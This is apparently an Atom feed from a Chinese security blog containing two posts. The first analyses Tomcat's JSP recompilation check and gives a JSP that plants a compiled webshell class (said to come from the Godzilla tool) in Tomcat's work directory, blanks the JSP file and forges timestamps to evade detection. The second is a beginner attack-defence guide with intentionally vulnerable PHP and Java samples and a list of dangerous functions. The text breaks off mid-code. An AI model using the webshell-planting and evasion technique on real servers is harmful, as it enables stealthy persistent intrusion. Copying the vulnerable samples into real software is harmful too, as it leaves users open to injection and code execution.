<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>kaikaix</title>
  
  <subtitle>小白</subtitle>
  <link href="https://kaikaix.github.io/atom.xml" rel="self"/>
  
  <link href="https://kaikaix.github.io/"/>
  <updated>2024-08-20T13:56:48.112Z</updated>
  <id>https://kaikaix.github.io/</id>
  
  <author>
    <name>kaikaix</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>空文件jsp免杀</title>
    <link href="https://kaikaix.github.io/2024/08/20/%E7%A9%BA%E6%96%87%E4%BB%B6jsp%E5%85%8D%E6%9D%80/"/>
    <id>https://kaikaix.github.io/2024/08/20/%E7%A9%BA%E6%96%87%E4%BB%B6jsp%E5%85%8D%E6%9D%80/</id>
    <published>2024-08-20T11:05:13.000Z</published>
    <updated>2024-08-20T13:56:48.112Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭配"><a href="#环境搭配" class="headerlink" title="环境搭配"></a>环境搭配</h1><p>tomcat 9.0.80</p><p>推荐看如下教程去搭建debug环境<br><a href="https://gitee.com/appleyk/tomact9-markdown">https://gitee.com/appleyk/tomact9-markdown</a><br><span id="more"></span></p><h1 id="jsp解析"><a href="#jsp解析" class="headerlink" title="jsp解析"></a>jsp解析</h1><p>Tomcat处理jsp的核心逻辑是它实现了一个处理jsp的Servlet<br><code>org.apache.jasper.servlet.JspServlet</code> ，这个Servlet处理所有以jsp和jspx为后缀的请求。</p><p>编译jsp的过程如下</p><ol><li>将jsp文件包装成java文件</li><li>将java文件编译为class文件</li><li>通过newInstance加载编译的class文件</li></ol><p>主要编译代码从这里开始<br><code>org.apache.jasper.JspCompilationContext#compile()</code><br><img src="/2024/08/20/%E7%A9%BA%E6%96%87%E4%BB%B6jsp%E5%85%8D%E6%9D%80/2.png" alt></p><p>跟入 <code>jspCompiler.compile();</code> 可以看到两行重要代码，先生成java文件，然后根据java文件生成class文件<br><img src="/2024/08/20/%E7%A9%BA%E6%96%87%E4%BB%B6jsp%E5%85%8D%E6%9D%80/3.png" alt></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String,SmapStratum&gt; smaps = generateJava();</span><br><span class="line">generateClass(smaps);</span><br></pre></td></tr></table></figure><p>编译后就通过反射去获取该servlet<br><img src="/2024/08/20/%E7%A9%BA%E6%96%87%E4%BB%B6jsp%E5%85%8D%E6%9D%80/4.png" alt><br><img src="/2024/08/20/%E7%A9%BA%E6%96%87%E4%BB%B6jsp%E5%85%8D%E6%9D%80/6.png" alt><br><img src="/2024/08/20/%E7%A9%BA%E6%96%87%E4%BB%B6jsp%E5%85%8D%E6%9D%80/5.png" alt></p><p>最后会将实例赋值给成员变量<br><img src="/2024/08/20/%E7%A9%BA%E6%96%87%E4%BB%B6jsp%E5%85%8D%E6%9D%80/7.png" alt></p><p>后面你访问的jsp，其实就相当于在访问这个servlet<br>详细步骤需要自己调试</p><h1 id="空文件jsp"><a href="#空文件jsp" class="headerlink" title="空文件jsp"></a>空文件jsp</h1><p>根据上述原理，其实只要可以直接写入该class文件，那么jsp的内容应该是无关紧要的<br>根据调试，发现编译出来的class文件位于<br><img src="/2024/08/20/%E7%A9%BA%E6%96%87%E4%BB%B6jsp%E5%85%8D%E6%9D%80/8.png" alt><br>但是如果直接去写入这个class文件是没有用的，经过我个人测试</p><ul><li>只修改class文件，然后访问那个jsp，会被重新编译</li><li>只修改java文件，不会被继续编译，class还是最初的</li></ul><p>回到刚刚的tomcat编译jsp的源码<br><img src="/2024/08/20/%E7%A9%BA%E6%96%87%E4%BB%B6jsp%E5%85%8D%E6%9D%80/9.png" alt><br>注意到这个<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jspCompiler.isOutDated()</span><br></pre></td></tr></table></figure><br>这个函数用于检测你的jsp是否有修改过，如果修改过就会重新编译，那么来看看内部细节是怎么检测的<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">File targetFile;</span><br><span class="line"><span class="keyword">if</span> (checkClass) &#123;</span><br><span class="line">    targetFile = <span class="keyword">new</span> <span class="title class_">File</span>(ctxt.getClassFileName());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    targetFile = <span class="keyword">new</span> <span class="title class_">File</span>(ctxt.getServletJavaFileName());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!targetFile.exists()) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">long</span> <span class="variable">targetLastModified</span> <span class="operator">=</span> targetFile.lastModified();</span><br><span class="line"><span class="keyword">if</span> (checkClass &amp;&amp; jsw != <span class="literal">null</span>) &#123;</span><br><span class="line">    jsw.setServletClassLastModifiedTime(targetLastModified);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Long</span> <span class="variable">jspRealLastModified</span> <span class="operator">=</span> ctxt.getLastModified(ctxt.getJspFile());</span><br><span class="line"><span class="keyword">if</span> (jspRealLastModified.longValue() &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// Something went wrong - assume modification</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (targetLastModified != jspRealLastModified.longValue()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">        log.debug(<span class="string">&quot;Compiler: outdated: &quot;</span> + targetFile + <span class="string">&quot; &quot;</span></span><br><span class="line">                + targetLastModified);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// determine if source dependent files (e.g. includes using include</span></span><br><span class="line"><span class="comment">// directives) have been changed.</span></span><br><span class="line"><span class="keyword">if</span> (jsw == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Map&lt;String,Long&gt; depends = jsw.getDependants();</span><br><span class="line"><span class="keyword">if</span> (depends == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>看到上面的代码，可以知道他会拿jsp的时间戳与class的时间戳进行比对，如果不一致就会重新编译</p><blockquote><p>在重新编译后会将class文件的时间戳设置为jsp的时间戳<br>这个 depends 应该是include里面需要编译的文件，没测试过</p></blockquote><p>那么修改class以后就会改变时间戳，所以导致刚刚测试会重新编译</p><p>这里还有一个需要注意的点就是<br>刚刚分析代码的时候提到过<br>servlet会将实例赋值给成员变量，你之后在不更改jsp的情况下，访问的都是已经加载在内存中的servlet<br><img src="/2024/08/20/%E7%A9%BA%E6%96%87%E4%BB%B6jsp%E5%85%8D%E6%9D%80/7.png" alt></p><p>所以如果想写一个jsp，然后去写入该jsp的class文件，在把自身写入的东西清楚掉，伪代码类似下面<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">写入恶意class</span><br><span class="line">清空自身文件内容</span><br><span class="line">改变class文件和自身jsp为相同的时间戳</span><br></pre></td></tr></table></figure><br>然后在去访问该jsp，你会发现这个jsp还是之前的功能，并不会是恶意的class文件的功能，因为他已经把之前的class内容加载到内存中了<br>那么这里我能想到有两个解决方案</p><ul><li>重启tomcat，让他重新加载class文件</li><li>写入其他jsp，比如用一个a.jsp写入b.jsp和b_jsp.class</li></ul><h1 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h1><p>我直接将哥斯拉的jsp生成的class文件复制出来，没有特别去生成<br>这样下面的代码在不涉及任何反射和rce函数，只操控文件的方法下完成了哥斯拉jsp🐴的注入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Base64&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.file.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.file.attribute.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.concurrent.TimeUnit&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 文件路径</span></span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">filePathJSP</span> <span class="operator">=</span> application.getRealPath(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;output.jsp&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">fullPath</span> <span class="operator">=</span> application.getRealPath(request.getRequestURI());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建 File 对象</span></span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fullPath);</span><br><span class="line">    <span class="type">String</span> <span class="variable">folderName</span> <span class="operator">=</span> file.getParentFile().getName();</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">filePathCLASS</span> <span class="operator">=</span> application.getRealPath(<span class="string">&quot;/&quot;</span>) +<span class="string">&quot;../../work/Catalina/localhost/&quot;</span>+folderName+<span class="string">&quot;/org/apache/jsp/output_jsp.class&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">filePathCLASSX</span> <span class="operator">=</span> application.getRealPath(<span class="string">&quot;/&quot;</span>) +<span class="string">&quot;../../work/Catalina/localhost/&quot;</span>+folderName+<span class="string">&quot;/org/apache/jsp/output_jsp$X.class&quot;</span>;</span><br><span class="line"></span><br><span class="line">    String[] paths = &#123;filePathJSP,filePathCLASS,filePathCLASSX&#125;;</span><br><span class="line"></span><br><span class="line">    String[] contents = &#123;</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建 FileWriter 对象</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> paths[i];</span><br><span class="line">        <span class="type">String</span> <span class="variable">encodedContent</span> <span class="operator">=</span> contents[i];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Base64 解码</span></span><br><span class="line">        <span class="type">byte</span>[] decodedBytes = Base64.getDecoder().decode(encodedContent);</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(path);</span><br><span class="line">        fileOutputStream.write(decodedBytes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭 FileOutputStream</span></span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        <span class="comment">// 输出确认信息</span></span><br><span class="line">        out.println(<span class="string">&quot;Content written successfully to: &quot;</span> + path + <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取文件路径对象</span></span><br><span class="line">            <span class="type">Path</span> <span class="variable">p</span> <span class="operator">=</span> Paths.get(path);</span><br><span class="line">            <span class="type">long</span> <span class="variable">newTimestamp</span> <span class="operator">=</span> <span class="number">1724085293L</span>;</span><br><span class="line">            <span class="comment">// 将时间戳转换为 FileTime 对象</span></span><br><span class="line">            <span class="type">FileTime</span> <span class="variable">fileTime</span> <span class="operator">=</span> FileTime.from(newTimestamp, TimeUnit.SECONDS);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 更改文件的修改时间和访问时间</span></span><br><span class="line">            Files.setLastModifiedTime(p, fileTime);</span><br><span class="line"></span><br><span class="line">            out.println(<span class="string">&quot;File timestamp updated successfully.&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            out.println(<span class="string">&quot;Error updating file timestamp: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境搭配&quot;&gt;&lt;a href=&quot;#环境搭配&quot; class=&quot;headerlink&quot; title=&quot;环境搭配&quot;&gt;&lt;/a&gt;环境搭配&lt;/h1&gt;&lt;p&gt;tomcat 9.0.80&lt;/p&gt;
&lt;p&gt;推荐看如下教程去搭建debug环境&lt;br&gt;&lt;a href=&quot;https://gitee.com/appleyk/tomact9-markdown&quot;&gt;https://gitee.com/appleyk/tomact9-markdown&lt;/a&gt;&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="https://kaikaix.github.io/categories/java/"/>
    
    
    <category term="代码审计" scheme="https://kaikaix.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="java" scheme="https://kaikaix.github.io/tags/java/"/>
    
    <category term="tomcat" scheme="https://kaikaix.github.io/tags/tomcat/"/>
    
    <category term="jsp" scheme="https://kaikaix.github.io/tags/jsp/"/>
    
  </entry>
  
  <entry>
    <title>awdp-web-小白</title>
    <link href="https://kaikaix.github.io/2024/06/12/awdp-web-%E5%B0%8F%E7%99%BD/"/>
    <id>https://kaikaix.github.io/2024/06/12/awdp-web-%E5%B0%8F%E7%99%BD/</id>
    <published>2024-06-12T14:31:40.000Z</published>
    <updated>2024-06-12T22:41:33.636Z</updated>
    
    <content type="html"><![CDATA[<h1 id="awdp"><a href="#awdp" class="headerlink" title="awdp"></a>awdp</h1><p>因为本章纯新手向，所以只讲讲防御应该怎么防御<br>awdp介绍<br>一般会给你一个附件让修复里面的漏洞，然后提交修复好的附件进行check，并且提交次数是有限制的，假如是5次，你提交5次都没check过，那你就不允许继续提交了，所以要谨慎修复<br><span id="more"></span></p><h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="seay-amp-d盾"><a href="#seay-amp-d盾" class="headerlink" title="seay &amp; d盾"></a>seay &amp; d盾</h2><p>下载后直接扫描，会给出漏洞结果，但是该工具是基于正则表达式，所以可能存在很多误报<br>d盾也可以扫描，但是扫描结果不全，但是准确率高点，推荐先用d盾进行扫描</p><blockquote><p>seay无法扫描到一些较新的漏洞函数，还有反序列化的函数也无法扫描</p></blockquote><h2 id="watchbird"><a href="#watchbird" class="headerlink" title="watchbird"></a>watchbird</h2><p><a href="https://github.com/leohearts/awd-watchbird">https://github.com/leohearts/awd-watchbird</a><br>根据教程直接安装</p><h2 id="常见漏洞代码"><a href="#常见漏洞代码" class="headerlink" title="常见漏洞代码"></a>常见漏洞代码</h2><p>下面只是给出漏洞代码，如果watchbird不能解决的问题，那也不是给小白解决的，所以只给出简单漏洞代码，和修复建议</p><h3 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查连接</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 含有SQL注入漏洞的查询</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username = &#x27;<span class="subst">$username</span>&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;登录成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;用户名或密码错误&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一般修复就是对 <code>$password</code> 进行过滤，过滤掉引号那些</p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$uploadDirectory</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">    <span class="variable">$uploadFile</span> = <span class="variable">$uploadDirectory</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查上传目录是否存在，不存在则创建</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDirectory</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDirectory</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不安全的文件上传</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$uploadFile</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件已成功上传。&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件上传失败。&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>未限制后缀名，直接上传，修复方法直接白名单后缀</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不安全的文件包含</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$page</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;未指定页面。&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最简单的方法就是直接删掉 include<br>当然还有以下几个可以文件包含的函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span></span><br><span class="line"><span class="keyword">require</span></span><br></pre></td></tr></table></figure></p><h3 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h3><p>给出最常见的命令执行函数，遇见直接删掉就行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span></span><br><span class="line">system</span><br><span class="line">`` <span class="comment">// 反引号</span></span><br><span class="line">exec</span><br><span class="line">shell_exec</span><br></pre></td></tr></table></figure></p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unserialize</span><br><span class="line"><span class="comment">//还有一些和文件相关的函数</span></span><br></pre></td></tr></table></figure><p>直接删除即可</p><h1 id="java"><a href="#java" class="headerlink" title="java"></a>java</h1><h2 id="springboot-jar"><a href="#springboot-jar" class="headerlink" title="springboot jar"></a>springboot jar</h2><ol><li>jar包解压</li><li><code>python class2java.py BOOT-INF/classes/com #根据具体路径</code></li><li>IDEA打开BOOT-INF/classes，导入BOOT-INF/lib，开始调试</li><li>加入防御代码，编译运行后，将target里面编译后新的class文件粘贴到原本的jar包中</li></ol><h2 id="反序列化-1"><a href="#反序列化-1" class="headerlink" title="反序列化"></a>反序列化</h2><p>我这里只讲java的原生反序列化，不涉及hessian，kryo等其他序列化器<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/deserialize&quot;)</span></span><br><span class="line"><span class="keyword">public</span> DataObject <span class="title function_">deserializeBase64</span><span class="params">(<span class="meta">@RequestBody</span> String base64Data)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 解码 Base64 数据</span></span><br><span class="line">        <span class="type">byte</span>[] data = Base64.getDecoder().decode(base64Data);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化数据</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data))) &#123;</span><br><span class="line">            <span class="keyword">return</span> (DataObject) ois.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Failed to deserialize object&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>大概漏洞原理就是反序列化的时候，会执行需要反序列化的类的readObject，而该类的readObject含有高危代码，或者可以构造出高危漏洞的代码</p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>重写 ObjectInputStream#readClassDescriptor (重新该类是为了防止utf8-overlong绕过)<br>添加黑名单（白名单最好）</p><p>MyObjectInputStream.java（记得加package）</p><div class="spoiler collapsed">    <div class="spoiler-title">        点击显/隐内容    </div>    <div class="spoiler-content">        <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 